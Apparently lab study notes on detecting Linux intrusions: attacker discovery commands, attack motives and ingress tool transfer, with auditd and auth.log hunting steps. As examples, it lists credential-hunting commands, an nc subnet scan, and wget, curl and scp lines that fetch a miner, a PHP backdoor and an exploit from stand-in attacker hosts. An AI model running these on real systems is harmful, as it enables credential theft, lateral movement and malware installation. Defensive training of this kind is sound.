# Discovery Overview

Some basic Discovery examples:

1) **OS and Filesystem Discovery**: `pwd`, `ls /`, `env, uname -a`, `lsb_release -a`, `hostname`
2) **User and Groups Discovery**: `id`, `whoami`, `w`, `last`, `cat /etc/sudoers`, `cat /etc/passwd`
3) **Process and Network Discovery**: `ps aux`, `top`, `ip a`, `ip r`, `arp -a`, `ss -tnlp`, `netstat -tnlp`
4) **Cloud or Sandbox Discovery**: `systemd-detect-virt`, `lsmod`, `uptime`, `pgrep "<edr-or-sandbox>"`

# Detecting Discovery

1) Log common Discovery commands (e.g with Auditd)
2) Hunt for Discovery in SIEM or manually with ausearch
3) Use process tree to identify what caused the Discovery

## Typical Commands and their Attack Objectives

1) **Find and steal credentials and other sensitive data**: `history | grep pass`, `find / -name .env`, `find /home -name id_rsa`
2) **Identify how suitable the system is for crypto mining**: `cat /proc/cpuinfo`, `lscpu | grep Model`, `free -m`, `top`, `htop`
3) **Scan the internal network for other future victims**: `ping <ip>`, `for ip in 192.168.1.{1..254}; do nc -w 1 $ip 22 done`

# Motivation for Attacks

Common goals of attackers when breaching Linux can be organized into two informal categories: "Hack and Forget" and targeted attacks.

## "Hack and Forget" Attacks

These attacks run at scale and focus on quick gains. For example, a threat group may continuously scan the Internet for an exposed SSH with a "tryguessme" password and get a few victims every month. Then, after a quick discovery, the attack usually ends up in one of three scenarios below (or three scenarios at once):

- **Install Cryptominer**: Earn money by using the victim's CPU/GPU to mine cryptocurrency
- **Enroll to Botnet**: Add the victim to a botnet (e.g. Mirai(opens in new tab)) and use it for tasks like DDoS
- **Use as Proxy**: Use the victim to send phishing, host malware, or route the attacker's traffic

## Ingress Tool Transfer

In the vast majority of cases, they utilize one of these three preinstalled commands:

1) **Wget**: Download a file from the website
    - wget https://github.com/xmrig/[...]/xmrig-x64.tar.gz -O /tmp/miner.tar.gz
2) **Curl**: Make a request to the webpage
    - curl --output /var/www/html/backdoor.php "https://pastebin.thm/yTg0Ah6a"
3) **SSH**: Transfer a file via SCP or SFTP
    - scp kali@c2server:/home/kali/cve-2021-4034.sh /tmp/cve-2021-4034.sh

> To detect on victim, look for SSH logins in /var/log/auth.log
> To detect on victim, look for "scp" command in Auditd logs

## Additional Detection

For Ingress Tool Transfer, the SOC can also rely on:

**Network Traffic**

- A download from an IP previously seen in cyber attacks
- A download from a suspicious or known malicious domain, such as qfpkvwgq.thm
- A download from a public service known to host attack tools, such as GitHub

**File Events**
- A newly-created file in the temporary folders, like /tmp or /var/tmp
- A newly-created file named like exploit, shell.php, or kF1pBsY5

**Antivirus alerts**
- EDR or antivirus alert triggering on a new malicious file or process

# Detecting the Attack

You can also spot the attack manually using the two methods below:

1) Auth Logs: Look for successful SSH logins by password from untrusted, external IP addresses
    - `cat /var/log/auth.log | grep "Accepted"`
2) Auditd Process Logs: Look for execution of Discovery commands (e.g. uname, lscpu) and trace their origin
    - `ausearch -i -x [command]`